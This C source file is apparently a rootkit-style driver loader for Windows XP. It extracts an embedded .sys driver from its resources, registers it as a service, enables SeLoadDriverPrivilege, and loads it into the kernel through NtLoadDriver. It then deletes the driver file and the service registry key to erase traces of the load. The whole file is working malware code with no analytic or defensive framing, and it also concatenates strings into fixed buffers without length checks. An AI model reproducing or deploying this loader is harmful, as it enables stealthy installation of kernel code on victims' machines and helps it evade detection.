#include "api.h"
#include "NT.h"

BOOL InitKernel(LPSTR KernelFile);
void ShutdownKernel(LPSTR KernelFile);
BOOL ExtractDriver(LPSTR DestinationPath);
BOOL LoadDriver(LPSTR RegistryPath);
BOOL CreateRegistryServiceKey(LPSTR ServiceName, LPSTR FilePath, LPSTR RegistryPathOutput);
void DeleteRegistryServiceKey(LPSTR RegistryPath);
BOOL UnloadDriver(LPSTR RegistryPath);
BOOL getLoadDriverPriv();

BOOL loadDriverEx(char* driverName) { return InitKernel(driverName); }
void unloadDriverEx(char* driverName) { ShutdownKernel(driverName); }

extern HINSTANCE hinst;

DWORD GetOsVersion()
{
	DWORD OsVersion;
	OSVERSIONINFOEX osviex;
	osviex.dwOSVersionInfoSize = sizeof(osviex);
	GetVersionEx((LPOSVERSIONINFO)&osviex);

	switch(osviex.dwPlatformId)
	{
		case VER_PLATFORM_WIN32_NT:
		if(osviex.dwMajorVersion==5&&osviex.dwMinorVersion==1)
		{
			switch(osviex.wServicePackMajor)
			{
				case 0:
					OsVersion = OS_XP_SP0;
					break;
				case 1:
					OsVersion = OS_XP_SP1;
					break;
				case 2:
					OsVersion = OS_XP_SP2;
					break;
				default:
				return 0;
			}
		}
		else
		{
			return 0;
		}
		break;
		default:
			return 0;
	}
	return OsVersion;
}

BOOL InitKernel(LPSTR KernelFile)
{
	BOOL bRet;
	char RegistryOutput[MAX_PATH];
	char SystemDirectory[MAX_PATH];
	GetSystemDirectory(SystemDirectory, sizeof(SystemDirectory));
	strcat(SystemDirectory, "\\");
	strcat(SystemDirectory, KernelFile);
	strcat(SystemDirectory, ".sys");
	bRet=ExtractDriver(SystemDirectory);
	if(!bRet)
	{
		return FALSE;
	}
	bRet=CreateRegistryServiceKey(KernelFile, SystemDirectory, RegistryOutput);
	if(!bRet)
	{
		DeleteFile(SystemDirectory);
		return FALSE;
	}
	bRet=LoadDriver(RegistryOutput);
	if(!bRet)
	{
		DeleteFile(SystemDirectory);
		DeleteRegistryServiceKey(RegistryOutput);
		return FALSE;
	}
	DeleteFile(SystemDirectory);
	DeleteRegistryServiceKey(RegistryOutput);
	DeleteRegistryServiceKey(RegistryOutput);
	DeleteRegistryServiceKey(RegistryOutput);
	DeleteRegistryServiceKey(RegistryOutput);
	DeleteRegistryServiceKey(RegistryOutput);
	DeleteRegistryServiceKey(RegistryOutput);
	return TRUE;
}

void ShutdownKernel(LPSTR KernelFile)
{
	char RegistryOutput[MAX_PATH];
	char SystemDirectory[MAX_PATH];
	GetSystemDirectory(SystemDirectory, sizeof(SystemDirectory));
	strcat(SystemDirectory, "\\");
	strcat(SystemDirectory, KernelFile);
	strcat(SystemDirectory, ".sys");
	CreateRegistryServiceKey(KernelFile, SystemDirectory, RegistryOutput);
	UnloadDriver(RegistryOutput);
	DeleteRegistryServiceKey(RegistryOutput);
}

BOOL ExtractDriver(LPSTR DestinationPath)
{
	DWORD fuck;
	HANDLE hFile;
	HGLOBAL hDriverResource;
	HRSRC DriverResource;
	DWORD FileSize;
	PVOID FilePointer;
	DriverResource = FindResource(hinst, MAKEINTRESOURCE(IDR_DRIVER1), "Driver");
	if(!DriverResource)
	{
		return FALSE;
	}
	hDriverResource = LoadResource(hinst, DriverResource);
	if(!hDriverResource)
	{
		return FALSE;
	}
	FileSize = SizeofResource(hinst, DriverResource);
	FilePointer = LockResource(hDriverResource);
	hFile = CreateFile(DestinationPath, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if(hFile==INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	while(FileSize--)
	{
		WriteFile(hFile, FilePointer, 1, &fuck, NULL);
		FilePointer=(PVOID)((DWORD)FilePointer + 1);
	}
	CloseHandle(hFile);
	return TRUE;
}

BOOL LoadDriver(LPSTR RegistryPath)
{
	NTSTATUS Status;
	UNICODE_STRING uStr;
	ANSI_STRING aStr;
	char HardRegPath[500] = "\\Registry\\Machine\\";
	strcat(HardRegPath, RegistryPath);
	RtlInitAnsiString(&aStr, HardRegPath);	
	if(RtlAnsiStringToUnicodeString(&uStr, &aStr, TRUE) != STATUS_SUCCESS)
	return FALSE;
	else
	{
		Status = NtLoadDriver(&uStr);
		if(Status==STATUS_SUCCESS)
		{
			RtlFreeUnicodeString(&uStr);
			return TRUE;
		}
		RtlFreeUnicodeString(&uStr);
	}
	return FALSE;
}

BOOL CreateRegistryServiceKey(LPSTR ServiceName, LPSTR FilePath, LPSTR RegistryPathOutput)
{
	char RegistryPath[MAX_PATH]="System\\CurrentControlSet\\Services\\";
	char HardImagePath[500]="\\??\\";
	HKEY hkey;
		DWORD val;
	strcat(RegistryPath, ServiceName);
	strcat(HardImagePath, FilePath);
	if(RegCreateKey(HKEY_LOCAL_MACHINE, RegistryPath, &hkey) != ERROR_SUCCESS)
		return FALSE;
	if(RegSetValueEx(hkey, "DisplayName", 0, REG_SZ, (PBYTE)ServiceName, strlen(ServiceName))!=ERROR_SUCCESS)
		return FALSE;
	val = 1;
	if(RegSetValueEx(hkey, "Type", 0, REG_DWORD, (PBYTE)&val, sizeof(val))!=ERROR_SUCCESS)
		return FALSE;
	if(RegSetValueEx(hkey, "ErrorControl", 0, REG_DWORD, (PBYTE)&val, sizeof(val))!=ERROR_SUCCESS)
		return FALSE;
	val = 3;
	if(RegSetValueEx(hkey, "Start", 0, REG_DWORD, (PBYTE)&val, sizeof(val))!=ERROR_SUCCESS)
		return FALSE;
	if(RegSetValueEx(hkey, "ImagePath", 0, REG_EXPAND_SZ, (PBYTE)HardImagePath, strlen(HardImagePath))!=ERROR_SUCCESS)
		return FALSE;
	strcpy(RegistryPathOutput, RegistryPath);
	return TRUE;
}

void DeleteRegistryServiceKey(LPSTR RegistryPath)
{
	char RegPathEnum[500];
	RegDeleteKey(HKEY_LOCAL_MACHINE, RegistryPath);
	strcpy(RegPathEnum, RegistryPath);
	strcat(RegPathEnum, "\\Enum");
	RegDeleteKey(HKEY_LOCAL_MACHINE, RegPathEnum);
}

BOOL UnloadDriver(LPSTR RegistryPath)
{
	UNICODE_STRING uStr;
	ANSI_STRING aStr;
	char HardRegPath[500]="\\Registry\\Machine\\";
	strcat(HardRegPath, RegistryPath);
	RtlInitAnsiString(&aStr, HardRegPath);					
	if(RtlAnsiStringToUnicodeString(&uStr, &aStr, TRUE)!=STATUS_SUCCESS)
		return FALSE;
	else
	{
		if(NtUnloadDriver(&uStr)==STATUS_SUCCESS)
		{
			RtlFreeUnicodeString(&uStr);
			return TRUE;
		}
		RtlFreeUnicodeString(&uStr);
	}
	return FALSE;
}

BOOL getLoadDriverPriv()
{
	HANDLE hToken;

	if(OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		LUID huid;
		if(LookupPrivilegeValue(NULL, "SeLoadDriverPrivilege", &huid))
		{
			LUID_AND_ATTRIBUTES priv;
			priv.Attributes=SE_PRIVILEGE_ENABLED;
			priv.Luid=huid;

			TOKEN_PRIVILEGES tp;
			tp.PrivilegeCount=1;
			tp.Privileges[0]=priv;

			if(AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL))
			{
				return TRUE;
			}
		}
	}
	return FALSE;
}